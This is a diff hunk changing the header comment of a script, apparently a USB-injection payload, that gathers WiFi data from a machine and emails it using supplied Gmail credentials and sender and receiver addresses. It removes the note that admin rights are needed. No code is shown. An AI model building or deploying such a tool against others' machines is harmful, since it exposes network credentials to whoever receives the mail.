@@ -1,5 +1,5 @@
 /********************************************************************************
-  Gather WiFi data and email it,  !!! Need admin privileges !!! 
+  Gather WiFi data and email it
   Change line 27 and 46 ('Desktop') to location you want file saved
   Change line 46 'GMAIL_USERNAME'<-username ONLY, ;GMAIL_PASSWORD', 'SENDER_EMAIL', 'RECEIVER_EMAIL'.
   Change line 62 to set location file was saved
